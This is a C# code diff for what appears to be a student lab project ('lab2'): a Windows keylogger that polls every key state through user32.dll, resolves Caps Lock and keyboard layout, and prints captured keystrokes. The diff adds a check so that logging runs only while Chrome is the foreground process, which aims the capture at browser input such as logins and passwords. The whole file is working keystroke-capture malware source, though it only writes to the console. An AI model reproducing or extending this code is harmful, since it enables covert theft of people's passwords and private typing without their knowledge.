@@ -1,17 +1,21 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Globalization;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
+
 namespace lab2
 {
     class Program
     {
         [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);
         [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);
+        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, out int id);
         [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint thread);
 
+        private const string CHROME = "chrome";
+        
         private static bool _isCaps;
         private static string _keyboardLayout;
         
@@ -19,16 +23,19 @@ namespace lab2
         {
             while (true)
             {
-                Thread.Sleep(100);
-
-                for (int i = 0; i < 255; i++)
+                if(GetActiveWindow() == CHROME)
                 {
-                    int state = GetAsyncKeyState(i);
-                    if (state != 0)
+                    Thread.Sleep(100);
+
+                    for (int i = 0; i < 255; i++)
                     {
-                        _isCaps = Control.IsKeyLocked(Keys.CapsLock);
-                        _keyboardLayout = GetKeyboardLayout();
-                        Console.Write( GetSymbol(i));
+                        int state = GetAsyncKeyState(i);
+                        if (state != 0)
+                        {
+                            _isCaps = Control.IsKeyLocked(Keys.CapsLock);
+                            _keyboardLayout = GetKeyboardLayout();
+                            Console.Write(GetSymbol(i));
+                        }
                     }
                 }
             }
@@ -72,15 +79,21 @@ namespace lab2
                     break;
             }
             return inputData;
-            
         }
 
         private static string GetKeyboardLayout()
         {
             var foregroundWindow = GetForegroundWindow();
-            var foregroundProcess = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
+            var foregroundProcess = GetWindowThreadProcessId(foregroundWindow, out _);
             var keyboardLayout = GetKeyboardLayout(foregroundProcess).ToInt32() & 0xFFFF;
             return new CultureInfo(keyboardLayout).TwoLetterISOLanguageName;
+        }
+
+        private static string GetActiveWindow()
+        {
+            var foregroundWindow = GetForegroundWindow();
+            GetWindowThreadProcessId(foregroundWindow, out var id);
+            return Process.GetProcessById(id).ProcessName;
         }
     }
 }
